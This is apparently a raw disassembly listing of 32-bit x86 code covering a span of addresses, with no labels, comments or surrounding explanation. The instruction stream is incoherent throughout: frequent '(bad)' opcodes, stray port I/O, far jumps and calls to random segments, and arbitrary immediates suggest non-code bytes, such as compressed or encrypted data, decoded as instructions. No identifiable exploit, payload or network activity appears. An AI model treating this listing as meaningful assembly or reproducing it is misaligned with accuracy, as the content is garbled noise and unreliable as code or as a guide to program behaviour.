  6907d8:	in     eax,dx
  6907d9:	test   al,0x9c
  6907db:	out    0x9d,al
  6907dd:	and    ah,bl
  6907df:	mul    BYTE PTR [esi+0x38]
  6907e2:	data16 std 
  6907e4:	(bad)  
  6907e5:	cmc    
  6907e6:	dec    ecx
  6907e7:	cwde   
  6907e8:	das    
  6907e9:	cmp    ah,al
  6907eb:	inc    esi
  6907ec:	inc    eax
  6907ed:	aam    0x3b
  6907ef:	xchg   edx,eax
  6907f0:	or     cl,ah
  6907f2:	(bad)  [ebx+eax*1+0x42]
  6907f6:	sub    ebx,ebx
  6907f8:	cmc    
  6907f9:	mov    ah,0xfa
  6907fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6907fc:	adc    BYTE PTR [ecx-0x2948d5b7],ah
  690802:	jnp    0x6907e3
  690804:	and    eax,DWORD PTR [ecx+ebx*2]
  690807:	lods   al,BYTE PTR ds:[esi]
  690808:	xchg   edx,eax
  690809:	outs   dx,DWORD PTR ds:[esi]
  69080a:	inc    edi
  69080b:	jg     0x690874
  69080d:	mov    es,WORD PTR [ebp+edx*1-0x23]
  690811:	cmp    al,0xa4
  690813:	cmp    al,0xce
  690815:	dec    ecx
  690816:	pushf  
  690817:	push   edi
  690818:	mov    esp,0x3ae04304
  69081d:	es aad 0x4
  690820:	sar    ebp,cl
  690822:	arpl   WORD PTR [edx-0x57535774],dx
  690828:	jge    0x6907f3
  69082a:	ins    BYTE PTR es:[edi],dx
  69082b:	sub    eax,0x8216727b
  690830:	retf   
  690831:	stos   DWORD PTR es:[edi],eax
  690832:	stos   BYTE PTR es:[edi],al
  690833:	in     al,0x4a
  690835:	xor    esi,DWORD PTR [ecx]
  690837:	mov    gs,WORD PTR [ebp+esi*8+0x6df70b92]
  69083e:	in     al,0xb8
  690840:	jg     0x69089f
  690842:	pop    ss
  690843:	dec    ebx
  690844:	jns    0x690855
  690846:	rol    BYTE PTR [ebx],1
  690848:	fild   QWORD PTR [esi-0x8]
  69084b:	(bad)  
  69084d:	push   ebx
  69084e:	(bad)
  690852:	mov    ds:0xa69b08b5,al
  690857:	(bad)  
  690858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690859:	out    dx,eax
  69085a:	mov    esi,0x16488899
  69085f:	retf   0xaee7
  690862:	mov    ecx,0x3e0def9a
  690867:	xchg   BYTE PTR [ebp+0x41],cl
  69086a:	sbb    edi,edi
  69086c:	ds push di
  69086f:	add    dh,BYTE PTR [ecx]
  690871:	jno    0x6908f0
  690873:	add    eax,0x6018a70d
  690878:	mov    cl,BYTE PTR [edx-0x50]
  69087b:	dec    DWORD PTR [ecx-0x597c25f8]
  690881:	xor    al,0x48
  690883:	dec    ebp
  690884:	ror    eax,0x1b
  690887:	pusha  
  690888:	dec    ecx
  690889:	xor    al,0xa6
  69088b:	mov    dh,0x59
  69088d:	xchg   edi,eax
  69088e:	rcl    BYTE PTR [eax],cl
  690890:	push   ecx
  690891:	inc    esi
  690892:	(bad)  
  690893:	and    DWORD PTR [ebp-0x75c41e9],eax
  690899:	ins    BYTE PTR es:[edi],dx
  69089a:	test   DWORD PTR [edi+0x25],edi
  69089d:	pop    ss
  69089e:	sub    ecx,ebp
  6908a0:	mov    WORD PTR [edi-0x7],?
  6908a3:	clc    
  6908a4:	mov    esp,0x3f138c
  6908a9:	enter  0x50db,0x76
  6908ad:	es loope 0x6908ba
  6908b0:	lea    esp,[edx+0x67]
  6908b3:	dec    ecx
  6908b4:	imul   edx,DWORD PTR es:[ebp-0x5b],0x41466cf4
  6908bc:	lea    edi,[edi-0x1b]
  6908bf:	jle    0x690917
  6908c1:	push   eax
  6908c2:	call   0x5eaba706
  6908c7:	je     0x6908b3
  6908c9:	loope  0x690930
  6908cb:	fstp   QWORD PTR [edx-0x4]
  6908ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6908cf:	stos   DWORD PTR es:[edi],eax
  6908d0:	cwde   
  6908d1:	sub    eax,0x49f8d47d
  6908d6:	(bad)  
  6908d7:	sub    al,0x5a
  6908d9:	cmp    ah,0xb2
  6908dc:	int    0x64
  6908de:	aam    0xe
  6908e0:	shr    DWORD PTR [edi+0xc85de23],cl
  6908e6:	ja     0x6908a3
  6908e8:	mov    WORD PTR [ebp+0x19],ds
  6908eb:	and    dh,BYTE PTR es:[esi-0x6e]
  6908ef:	ss out dx,eax
  6908f1:	add    BYTE PTR ds:0x5b401140,bh
  6908f7:	jae    0x6908a4
  6908f9:	clc    
  6908fa:	ds icebp 
  6908fc:	add    DWORD PTR [eax+0x16],ebp
  6908ff:	mov    edi,0x6dd1351f
  690904:	fs aam 0xbf
  690907:	int3   
  690908:	int3   
  690909:	push   ebx
  69090a:	mov    DWORD PTR [ebp-0x41a7bb40],eax
  690910:	jno    0x690990
  690912:	jno    0x690937
  690914:	imul   edi,DWORD PTR [esi+0x797c57fe],0xbfe9e2bb
  69091e:	mov    edi,0xa6ce8aec
  690923:	xchg   ecx,eax
  690924:	jp     0x690921
  690926:	pusha  
  690927:	mov    WORD PTR [ebp+0x31],?
  69092a:	sahf   
  69092b:	je     0x690969
  69092d:	out    0x25,eax
  69092f:	stc    
  690930:	jmp    0x145b8eff
  690935:	ds cmc 
  690937:	leave  
  690938:	cmp    bh,BYTE PTR [edi+0x8]
  69093b:	(bad)  
  69093c:	mov    gs:0xa0e2103,ax
  690943:	retf   0x58a1
  690946:	lods   al,BYTE PTR ds:[esi]
  690947:	stc    
  690948:	mov    eax,?
  69094a:	sbb    ah,BYTE PTR [edx]
  69094c:	int    0xa5
  69094e:	lods   eax,DWORD PTR ds:[esi]
  69094f:	call   0xfcedac29
  690954:	ja     0x6908f5
  690956:	gs stos DWORD PTR es:[edi],eax
  690958:	cwde   
  690959:	lods   eax,DWORD PTR ds:[esi]
  69095a:	push   ds
  69095b:	jo     0x6909d7
  69095d:	addr16 (bad) 
  690960:	clc    
  690961:	loope  0x690943
  690963:	std    
  690964:	ins    DWORD PTR es:[edi],dx
  690965:	dec    ecx
  690966:	loop   0x69097b
  690968:	call   0xbe44369e
  69096d:	scas   eax,DWORD PTR es:[edi]
  69096e:	or     BYTE PTR ds:0x9ea8706d,ch
  690974:	dec    esi
  690975:	push   eax
  690976:	add    al,BYTE PTR [eax]
  690978:	xor    al,ch
  69097a:	imul   edi,DWORD PTR [eax+0x1],0x33
  69097e:	push   es
  69097f:	and    BYTE PTR [edx],bl
  690981:	loope  0x690993
  690983:	sbb    BYTE PTR [edi+0x53f68733],bl
  690989:	fmul   QWORD PTR [ecx-0x1d6d4345]
  69098f:	imul   edx,DWORD PTR [edi+0x14ae6059],0x7b
  690996:	pop    esp
  690997:	mov    cl,0x43
  690999:	das    
  69099a:	mov    eax,0x34f12790
  69099f:	test   DWORD PTR [ecx+0x41e680aa],ebx
  6909a5:	adc    DWORD PTR [edx+0x66],esi
  6909a8:	push   0x7eb06802
  6909ad:	and    DWORD PTR [esi+0x66],ecx
  6909b0:	push   esp
  6909b1:	mov    al,ds:0xc8d15009
  6909b6:	(bad)  
  6909b7:	out    dx,eax
  6909b8:	stos   BYTE PTR es:[edi],al
  6909b9:	js     0x6909ed
  6909bb:	inc    esi
  6909bc:	inc    BYTE PTR [edx+0x50]
  6909bf:	lds    eax,FWORD PTR gs:[ecx+0x7a]
  6909c3:	fadd   DWORD PTR [ebx]
  6909c5:	mov    eax,ds:0xba0a27ef
  6909ca:	sub    BYTE PTR [eax-0x75],ch
  6909cd:	in     al,0x95
  6909cf:	jl     0x6909f4
  6909d1:	pop    esi
  6909d2:	std    
  6909d3:	xor    eax,0x8a34b99e
  6909d8:	sub    DWORD PTR [ecx+0x2f],esi
  6909db:	iret   
  6909dc:	(bad)  
  6909dd:	(bad)  
  6909de:	jl     0x6909b9
  6909e0:	pop    esi
  6909e1:	fistp  DWORD PTR [edi-0x762dc60a]
  6909e7:	mov    edx,0x6b522dc5
  6909ec:	std    
  6909ed:	repz out 0x9,eax
  6909f0:	dec    edx
  6909f1:	sub    eax,0x3679c1ff
  6909f6:	jp     0x690a4e
  6909f8:	and    esi,DWORD PTR [eax-0x38218cae]
  6909fe:	adc    al,BYTE PTR [ecx]
  690a00:	ffreep st(2)
  690a02:	dec    ecx
  690a03:	dec    esi
  690a04:	in     al,0x5b
  690a06:	xor    esi,ebx
  690a08:	std    
  690a09:	xchg   esp,eax
  690a0a:	out    0xbc,eax
  690a0c:	ret    
  690a0d:	out    0x3a,eax
  690a0f:	xchg   esp,eax
  690a10:	shl    DWORD PTR [esi-0xd78de93],cl
  690a16:	pop    edx
  690a17:	jle    0x690a32
  690a19:	out    dx,al
  690a1a:	or     bh,al
  690a1c:	ja     0x6909b2
  690a1e:	add    eax,0x328a6348
  690a23:	jnp    0x690a86
  690a25:	ins    DWORD PTR es:[edi],dx
  690a26:	cmp    DWORD PTR [edi+0x7e82251b],ebx
  690a2c:	mov    dl,0x1c
  690a2e:	out    dx,eax
  690a2f:	and    BYTE PTR [eax],0xbc
  690a32:	retf   
  690a33:	adc    bl,BYTE PTR [edi-0x8a9d199]
  690a39:	daa    
  690a3a:	cld    
  690a3b:	call   0x904642f
  690a40:	imul   esp,DWORD PTR [edx+eiz*8-0x6d371127],0xffffffce
  690a48:	add    eax,0xfd85b050
  690a4d:	cdq    
  690a4e:	dec    esi
  690a4f:	push   eax
  690a50:	pop    ebp
  690a51:	lds    eax,FWORD PTR [ecx-0x41]
  690a54:	fs (bad) 
  690a56:	daa    
  690a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  690a58:	mov    ds:0xe3a6044f,al
  690a5d:	icebp  
  690a5e:	and    dh,dl
  690a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  690a61:	jno    0x690ac4
  690a63:	cmp    al,ah
  690a65:	mov    ebx,edx
  690a67:	pop    ss
  690a68:	adc    BYTE PTR [esi+0xd],ch
  690a6b:	sub    al,0xfe
  690a6d:	iret   
  690a6e:	dec    eax
  690a6f:	add    ecx,eax
  690a71:	dec    edx
  690a72:	jae    0x690a5c
  690a74:	sbb    edi,DWORD PTR [edi]
  690a76:	mov    ch,0x2
  690a78:	(bad)
  690a7b:	and    al,0x72
  690a7d:	add    DWORD PTR [ebx],0xe88eef49
  690a83:	adc    al,0xfb
  690a85:	int3   
  690a86:	xor    eax,0x94f4eecf
  690a8b:	scas   al,BYTE PTR es:[edi]
  690a8c:	lock lahf 
  690a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  690a8f:	stos   BYTE PTR es:[edi],al
  690a90:	pop    eax
  690a91:	and    esi,esp
  690a93:	sahf   
  690a94:	push   esi
  690a95:	aaa    
  690a96:	jmp    0x690ac1
  690a98:	(bad)  
  690a99:	pop    ss
  690a9a:	sbb    BYTE PTR [edi+0xa7292a],0x94
  690aa1:	cmc    
  690aa2:	jbe    0x690ae5
  690aa4:	(bad)  
  690aa5:	jecxz  0x690a6d
  690aa7:	xor    eax,0x66d4257e
  690aac:	sbb    al,0x52
  690aae:	mov    ss,WORD PTR [eax+0x5d668fc7]
  690ab4:	inc    ebp
  690ab5:	fsubr  QWORD PTR [esi]
  690ab7:	mov    ah,0xdf
  690ab9:	mov    BYTE PTR [ecx+ebx*4-0x23dbae9b],al
  690ac0:	(bad)  
  690ac1:	call   0x6b98e060
  690ac6:	dec    ebp
  690ac7:	pop    edi
  690ac8:	leave  
  690ac9:	push   cs
  690aca:	cmp    eax,0x97f8a161
  690acf:	stos   DWORD PTR es:[edi],eax
  690ad0:	push   ss
  690ad1:	sbb    eax,0x6f48a87c
  690ad6:	sti    
  690ad7:	popa   
  690ad8:	jne    0x690b58
  690ada:	int    0x69
  690adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  690add:	mov    dl,0xf1
  690adf:	or     ch,0x69
  690ae2:	retf   
  690ae3:	pop    ds
  690ae4:	jecxz  0x690adf
  690ae6:	pop    ds
  690ae7:	mov    ebx,0xd291417
  690aec:	pop    ecx
  690aed:	pop    ebp
  690aee:	and    BYTE PTR [esi-0x42c8eec8],bh
  690af4:	jmp    0xc176:0x61f9b101
  690afb:	jns    0x690aed
  690afd:	test   eax,0xad0e1321
  690b02:	pushf  
  690b03:	dec    edi
  690b04:	sbb    ax,0x7390
  690b08:	sti    
  690b09:	xor    edx,DWORD PTR [edx+0x76]
  690b0c:	sbb    eax,0x9dfef06b
  690b11:	imul   edi,ebx,0xffffffd4
  690b14:	loopne 0x690b7c
  690b16:	cmp    BYTE PTR [ebp+0x52],ch
  690b19:	push   esi
  690b1a:	sub    DWORD PTR [ebx],edx
  690b1c:	jns    0x690ad7
  690b1e:	jecxz  0x690b52
  690b20:	dec    edi
  690b21:	xor    BYTE PTR [esi],bl
  690b23:	add    dl,dh
  690b25:	push   esp
  690b26:	or     eax,0xe5c1e2e7
  690b2b:	clc    
  690b2c:	repnz jecxz 0x690ab5
  690b2f:	pop    edx
  690b30:	add    ah,BYTE PTR [ebx]
  690b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690b33:	mov    ss,ebx
  690b35:	int3   
  690b36:	mov    eax,0x5fa9b8da
  690b3b:	nop
  690b3c:	mov    eax,cs:0xab39e5bd
  690b42:	test   DWORD PTR [ecx-0x2b16b5e1],ebx
  690b48:	adc    BYTE PTR [edx+0x76689278],dl
  690b4e:	fsub   QWORD PTR [ecx+eax*4+0x28]
  690b52:	je     0x690b60
  690b54:	ror    esp,0x9d
  690b57:	cld    
  690b58:	pop    esi
  690b59:	push   es
  690b5a:	ret    
  690b5b:	ins    DWORD PTR es:[edi],dx
  690b5c:	ins    DWORD PTR es:[edi],dx
  690b5d:	das    
  690b5e:	loope  0x690b7c
  690b60:	xor    eax,0x48f3fbf7
  690b65:	mov    ah,0xbf
  690b67:	mov    dl,0x28
  690b69:	cdq    
  690b6a:	or     bh,bl
  690b6c:	cmp    edi,edi
  690b6e:	js     0x690b04
  690b70:	adc    BYTE PTR [edx],al
  690b72:	push   edx
  690b73:	aad    0x93
  690b75:	test   eax,0xc1429b27
  690b7a:	push   ds
  690b7b:	mov    ebx,0x9610abb3
  690b80:	pushf  
  690b81:	mov    eax,?
  690b83:	push   edx
  690b84:	shl    DWORD PTR [ecx],0xe8
  690b87:	arpl   WORD PTR [ebp-0x4e],bp
  690b8a:	call   0x464cfd93
  690b8f:	pop    esi
  690b90:	push   edi
  690b91:	lods   eax,DWORD PTR ds:[esi]
  690b92:	mov    ah,dh
  690b94:	out    dx,eax
  690b95:	(bad)  
  690b96:	jmp    0xa6d3:0xa42c128d
  690b9d:	and    bh,0xa8
  690ba0:	(bad)  
  690ba1:	cwde   
  690ba2:	and    BYTE PTR [edi+0x58],al
  690ba5:	and    al,0x81
  690ba7:	add    eax,0x1467444a
  690bac:	sbb    al,bh
  690bae:	test   eax,0x5a13de81
  690bb3:	push   cs
  690bb4:	xor    BYTE PTR [eax+0x4abdb2ea],ah
  690bba:	rol    ebp,0xb
  690bbd:	std    
  690bbe:	mov    ebx,0xebf5e184
  690bc3:	jmp    0xe18:0x7388a630
  690bca:	inc    edx
  690bcb:	fs shr ebx,cl
  690bce:	xchg   esi,eax
  690bcf:	test   edx,ecx
  690bd1:	rcl    BYTE PTR [esi+edi*8-0x1d],1
  690bd5:	mov    edi,0x79cb6323
  690bda:	fidivr DWORD PTR ds:[esi-0x784b5683]
  690be1:	jmp    0x4a68:0x42332e8c
  690be8:	jo     0x690bb5
  690bea:	ja     0x690c4f
  690bec:	mov    cl,0xff
  690bee:	repz ret 
  690bf0:	fcmovbe st,st(4)
  690bf2:	mov    ebp,DWORD PTR [esi+0x5f]
  690bf5:	mov    dh,al
  690bf7:	sbb    DWORD PTR [esi-0x7],eax
  690bfa:	jl     0x690ba6
  690bfc:	out    0xbc,eax
  690bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  690bff:	fwait
  690c00:	mov    ds:0x4aa17c72,eax
  690c05:	mov    eax,ds:0x729c4440
  690c0a:	jge    0x690c82
  690c0c:	(bad)  
  690c0d:	stos   DWORD PTR es:[edi],eax
  690c0e:	imul   BYTE PTR ds:0xedf1b8ce
  690c14:	and    ebp,eax
  690c16:	jmp    DWORD PTR [edx+0xf3a8ae2]
  690c1c:	pop    edi
  690c1d:	jmp    0x998905de
  690c22:	ds stos DWORD PTR es:[edi],eax
  690c24:	fs std 
  690c26:	mov    ecx,ebx
  690c28:	stos   DWORD PTR es:[edi],eax
  690c29:	cs cmp al,0xae
  690c2c:	fld    QWORD PTR [edi+0x5e0664fa]
  690c32:	xchg   ebx,eax
  690c33:	adc    ah,BYTE PTR [edi-0xf]
  690c36:	ins    BYTE PTR es:[edi],dx
  690c37:	(bad)  
  690c38:	(bad)  
  690c39:	adc    BYTE PTR [edx-0x299dc3c1],bh
  690c3f:	jecxz  0x690bc1
  690c41:	xchg   edi,eax
  690c42:	dec    esp
  690c43:	dec    ecx
  690c44:	jnp    0x690bde
  690c46:	mov    ecx,0xf4f81f6e
  690c4b:	xchg   edi,eax
  690c4c:	lods   al,BYTE PTR ds:[esi]
  690c4d:	adc    eax,0xbee7ad2e
  690c52:	div    BYTE PTR [ebp+0x46fbef9e]
  690c58:	sbb    eax,0x1669fa46
  690c5d:	mov    bl,0x30
  690c5f:	or     eax,DWORD PTR [ebp+0x62]
  690c62:	mov    al,ds:0xe077b833
  690c67:	repz dec edx
  690c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  690c6a:	mov    DWORD PTR [edx],edi
  690c6c:	mov    al,0xa1
  690c6e:	cmp    DWORD PTR [ecx+ecx*1-0x41],0x2a
  690c73:	cli    
  690c74:	push   edi
  690c75:	mov    ds:0xbe7de71b,eax
  690c7a:	push   esp
  690c7b:	imul   ebx,esi,0x7f5fe4ca
  690c81:	mov    WORD PTR [edi+eiz*1],es
  690c84:	dec    edi
  690c85:	sub    BYTE PTR [eax],ch
  690c87:	lock jl 0x690c34
  690c8a:	cld    
  690c8b:	mov    bh,0x8
  690c8d:	jl     0x690c2f
  690c8f:	xor    DWORD PTR [esi+0xa1f6282],ebx
  690c95:	and    DWORD PTR [ebx],ebx
  690c97:	dec    ecx
  690c98:	add    eax,0xa42efc45
  690c9d:	cwde   
  690c9e:	mov    bl,0x4f
  690ca0:	scas   al,BYTE PTR es:[edi]
  690ca1:	out    dx,eax
  690ca2:	push   edx
  690ca3:	mov    eax,0x937c6815
  690ca8:	inc    ebp
  690ca9:	fcmove st,st(3)
  690cab:	mov    bl,0x99
  690cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  690cae:	mov    bh,0x3
  690cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690cb1:	mov    al,ds:0x3a9ac966
  690cb6:	lods   eax,DWORD PTR ds:[esi]
  690cb7:	aad    0x5c
  690cb9:	cmp    eax,0xec52d7ca
  690cbe:	inc    ecx
  690cbf:	lods   al,BYTE PTR ds:[esi]
  690cc0:	inc    ebx
  690cc1:	pop    edx
  690cc2:	inc    esi
  690cc3:	xchg   ebp,eax
  690cc4:	push   ebx
  690cc5:	adc    ch,0x10
  690cc8:	sbb    BYTE PTR [ecx],cl
  690cca:	mov    ds:0x117934ac,eax
  690ccf:	adc    DWORD PTR [ecx+0x72],ebx
  690cd2:	cli    
  690cd3:	add    DWORD PTR [ebx+0x1f9c66ac],esp
  690cd9:	sbb    ecx,DWORD PTR [edi]
  690cdb:	xor    DWORD PTR [edi+0x7b9cb16d],edx
  690ce1:	js     0x690c99
  690ce3:	and    DWORD PTR [eax],ebx
  690ce5:	sub    BYTE PTR ss:[ebx+0x6d],ch
  690ce9:	push   ds
  690cea:	ja     0x690cc4
  690cec:	pop    edx
  690ced:	jmp    0x3d9b:0xc4e39876
  690cf4:	lods   eax,DWORD PTR ds:[esi]
  690cf5:	sbb    eax,0x9b6a082d
  690cfa:	and    eax,0x75697c3c
  690cff:	scas   eax,DWORD PTR es:[edi]
  690d00:	mov    eax,0x7bd3b61a
  690d05:	sti    
  690d06:	enter  0x4a6b,0x2d
  690d0a:	dec    edx
  690d0b:	mov    bl,0x51
  690d0d:	pop    edx
  690d0e:	fdiv   DWORD PTR [ecx-0x36]
  690d11:	(bad)  
  690d12:	lods   eax,DWORD PTR ds:[esi]
  690d13:	or     esi,DWORD PTR [eax+0x75]
  690d16:	xchg   ebp,eax
  690d17:	gs xchg ecx,eax
  690d19:	jle    0x690d5b
  690d1b:	ds test edi,ecx
  690d1e:	enter  0xe133,0xd
  690d22:	dec    eax
  690d23:	call   0x9fb4:0xefcb5527
  690d2a:	inc    ebp
  690d2b:	icebp  
  690d2c:	stos   DWORD PTR es:[edi],eax
  690d2d:	inc    edx
  690d2e:	xor    BYTE PTR [ebx-0x5d3a6adb],dl
  690d34:	mov    ch,0xba
  690d36:	dec    ecx
  690d37:	adc    al,0x90
  690d39:	or     DWORD PTR [edi+0x40],ebp
  690d3c:	pop    eax
  690d3d:	iret   
  690d3e:	iret   
  690d3f:	add    esi,0x28f87625
  690d45:	out    0x65,eax
  690d47:	inc    esi
  690d48:	adc    eax,0xf1339957
  690d4d:	(bad)  
  690d4f:	inc    edi
  690d50:	dec    ecx
  690d51:	stc    
  690d52:	xchg   ebx,eax
  690d53:	stc    
  690d54:	mov    dh,0x54
  690d56:	enter  0x89b3,0xe8
  690d5a:	(bad)  
  690d5c:	test   DWORD PTR [ebx-0x64],ecx
  690d5f:	pop    eax
  690d60:	icebp  
  690d61:	jb     0x690d60
  690d63:	and    al,0x7d
  690d65:	mov    eax,0x3d01a0c1
  690d6a:	rcl    bh,1
  690d6c:	cmp    al,cl
  690d6e:	jne    0x690d7d
  690d70:	rol    BYTE PTR [edx-0x53],cl
  690d73:	pop    edx
  690d74:	cld    
  690d75:	mov    ah,0xd3
  690d77:	push   0xffffffd3
  690d79:	ret    
  690d7a:	adc    esp,DWORD PTR [edi+0x2ebcee4f]
  690d80:	or     BYTE PTR [eax-0x44],bl
  690d83:	enter  0xc79d,0x69
  690d87:	cmp    BYTE PTR [ecx-0x1c37d599],0xb0
  690d8e:	xor    DWORD PTR [eax],0xee738376
  690d94:	fs push ecx
  690d96:	aaa    
  690d97:	sub    ebp,DWORD PTR [ebx-0x110aa2b6]
  690d9d:	fsub   QWORD PTR [ebx+0x5de4c74e]
  690da3:	xchg   DWORD PTR [edi-0x28],edi
  690da6:	repnz cmc 
  690da8:	stc    
  690da9:	mov    eax,0x84f216c2
  690dae:	mov    bl,BYTE PTR [eax-0x19]
  690db1:	rcr    BYTE PTR [ebp-0x4731fa86],cl
  690db7:	xchg   esi,eax
  690db8:	sar    BYTE PTR [esi-0x67],1
  690dbb:	cmc    
  690dbc:	inc    esp
  690dbd:	dec    eax
  690dbe:	push   es
  690dbf:	pop    edi
  690dc0:	imul   edx,DWORD PTR [edi],0x47
  690dc3:	adc    edx,DWORD PTR [ecx+0x3c84f768]
  690dc9:	pop    edx
  690dca:	out    0x73,eax
  690dcc:	xchg   esp,eax
  690dcd:	das    
  690dce:	fwait
  690dcf:	jns    0x690e39
  690dd1:	or     edx,DWORD PTR [ebp-0x1abc51d3]
  690dd7:	lock in al,0xac
  690dda:	loop   0x690e0b
  690ddc:	or     ah,0x87
  690ddf:	sub    eax,DWORD PTR [eax]
  690de1:	(bad)  
  690de2:	fs in  al,dx
  690de4:	push   ss
  690de5:	test   eax,0x2a26aa1e
  690dea:	fiadd  DWORD PTR [edx]
  690dec:	pop    es
  690ded:	cmp    esi,DWORD PTR [ecx]
  690def:	sub    BYTE PTR [esi-0x48],dh
  690df2:	mov    eax,0x4cdbfc0f
  690df7:	cmp    ah,dh
  690df9:	leave  
  690dfa:	icebp  
  690dfb:	sbb    DWORD PTR [edx],esi
  690dfd:	cmp    DWORD PTR [edx+0x38],edx
  690e00:	scas   al,BYTE PTR es:[edi]
  690e01:	shr    ah,0xe9
  690e04:	inc    edi
  690e05:	dec    ebp
  690e06:	jno    0x690dc5
  690e08:	je     0x690da5
  690e0a:	sbb    DWORD PTR [ebx],esi
  690e0c:	call   FWORD PTR [edi-0x43cd9252]
  690e12:	sub    edi,DWORD PTR [ebx+0x948744c]
  690e18:	sub    esi,DWORD PTR [eax+0x74031a10]
  690e1e:	xchg   ebx,eax
  690e1f:	popa   
  690e20:	int3   
  690e21:	cmp    cl,BYTE PTR [edi]
  690e23:	repnz loope 0x690dc8
  690e26:	xor    DWORD PTR [esi],esp
  690e28:	cli    
  690e29:	scas   eax,DWORD PTR es:[edi]
  690e2a:	sbb    ebx,DWORD PTR es:[edx]
  690e2d:	mov    DWORD PTR [ebx+0x6f96d656],ebx
  690e33:	cmp    ebx,DWORD PTR [ebx-0x41]
  690e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  690e37:	bound  esi,QWORD PTR [edi+0x73083dce]
  690e3d:	cmp    al,0x29
  690e3f:	fcmovb st,st(0)
  690e41:	dec    BYTE PTR [edi]
  690e43:	jmp    0xcf85:0xa92ba6a8
  690e4a:	jns    0x690e86
  690e4c:	inc    edx
  690e4d:	sub    al,BYTE PTR [ebx+edi*1-0x44]
  690e51:	or     eax,DWORD PTR [eax-0x62351996]
  690e57:	adc    al,0xb0
  690e59:	jl     0x690e23
  690e5b:	rcl    BYTE PTR [esi],1
  690e5d:	cmp    edx,DWORD PTR [ecx]
  690e5f:	push   ebx
  690e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  690e61:	dec    esi
  690e62:	pop    ebx
  690e63:	(bad)  
  690e64:	xchg   esi,eax
  690e65:	cmc    
  690e66:	cmc    
  690e67:	xor    eax,0xdcdca5e8
  690e6c:	dec    esi
  690e6d:	std    
  690e6e:	mov    al,ds:0x3988fa06
  690e73:	inc    edx
  690e74:	adc    ch,bl
  690e76:	lock (bad) 
  690e78:	(bad)  
  690e79:	loope  0x690eb1
  690e7b:	jmp    0x81b6:0xc5293a3a
  690e82:	pop    edi
  690e83:	push   es
  690e84:	add    eax,0xd1a08cd
  690e89:	xor    eax,ebx
  690e8b:	gs aam 0xf2
  690e8e:	jmp    0x690e72
  690e90:	ins    BYTE PTR es:[edi],dx
  690e91:	add    ch,cl
  690e93:	rcr    BYTE PTR [ebp+0x7c3cc559],1
  690e99:	mov    bl,0xf6
  690e9b:	and    cl,dh
  690e9d:	dec    edx
  690e9e:	mov    dl,0x56
  690ea0:	fwait
  690ea1:	sub    ecx,DWORD PTR [eax]
  690ea3:	dec    esp
  690ea4:	fucomi st,st(2)
  690ea6:	mov    ds,WORD PTR [esi]
  690ea8:	icebp  
  690ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690eab:	test   eax,0xb82d92af
  690eb0:	cwde   
  690eb1:	xor    ebx,edi
  690eb3:	fstp   DWORD PTR [eax+0x5b31de37]
  690eb9:	fdiv   st(7),st
  690ebb:	inc    eax
  690ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690ebd:	into   
  690ebe:	fs loopne 0x690eff
  690ec1:	or     bl,ah
  690ec3:	loope  0x690e8f
  690ec5:	adc    esi,DWORD PTR [esp+eax*8+0x2b]
  690ec9:	dec    esp
  690eca:	pop    esi
  690ecb:	jle    0x690ed2
  690ecd:	mov    WORD PTR [ecx-0x46],?
  690ed0:	mov    bh,0x4c
  690ed2:	ror    DWORD PTR [esi],0x9b
  690ed5:	int    0x44
  690ed7:	mov    esp,0xdcb3ef96
  690edc:	jb     0x690f14
  690ede:	call   0xab289ec5
  690ee3:	pop    ecx
  690ee4:	iret   
  690ee5:	out    0x5d,al
  690ee7:	dec    esp
  690ee8:	retf   
  690ee9:	pop    ecx
  690eea:	enter  0x5c81,0x75
  690eee:	mov    gs,ebp
  690ef0:	push   ds
  690ef1:	ss inc ebx
  690ef3:	inc    esi
  690ef4:	inc    ebx
  690ef5:	stc    
  690ef6:	fwait
  690ef7:	mov    ds:0x16c854b,eax
  690efc:	mov    eax,ds:0xb3775966
  690f01:	stos   DWORD PTR es:[edi],eax
  690f02:	mov    esi,0x18cc738e
  690f07:	sbb    edx,esi
  690f09:	in     eax,dx
  690f0a:	xchg   ebx,eax
  690f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  690f0c:	mov    ecx,0x3bd06fc3
  690f11:	cmp    esi,esi
  690f13:	pop    es
  690f14:	and    eax,0x2b1f80a7
  690f19:	daa    
  690f1a:	lea    ecx,[ebp-0x303b5a6a]
  690f20:	stos   BYTE PTR es:[edi],al
  690f21:	retf   
  690f22:	das    
  690f23:	jae    0x690f1d
  690f25:	gs pop edx
  690f27:	dec    ebp
  690f28:	into   
  690f29:	rcl    DWORD PTR [eax+edi*1],cl
  690f2c:	add    bl,bl
  690f2e:	fdivr  st(7),st
  690f30:	test   BYTE PTR [eax],bh
  690f32:	pop    edi
  690f33:	popa   
  690f34:	pusha  
  690f35:	(bad)  
  690f36:	ins    DWORD PTR es:[edi],dx
  690f37:	inc    ebx
  690f38:	add    BYTE PTR [eax],al
  690f3a:	call   0xd812:0xa1ec4777
  690f41:	call   0xfb82:0x4a02a826
  690f48:	clc    
  690f49:	add    eax,0xd629d7a0
  690f4e:	aam    0x95
  690f50:	outs   dx,DWORD PTR ds:[esi]
  690f51:	push   edi
  690f52:	inc    ebp
  690f53:	cdq    
  690f54:	push   ebp
  690f55:	inc    ecx
  690f56:	jo     0x690f81
  690f58:	fs mov ebx,0x289bfb8b
  690f5e:	sub    BYTE PTR [eax+0x55],al
  690f61:	add    ebp,DWORD PTR [ecx+eax*1+0x9]
  690f65:	and    DWORD PTR [ecx+0x2f],0x4d698aeb
  690f6c:	xor    eax,0xdcdb68b0
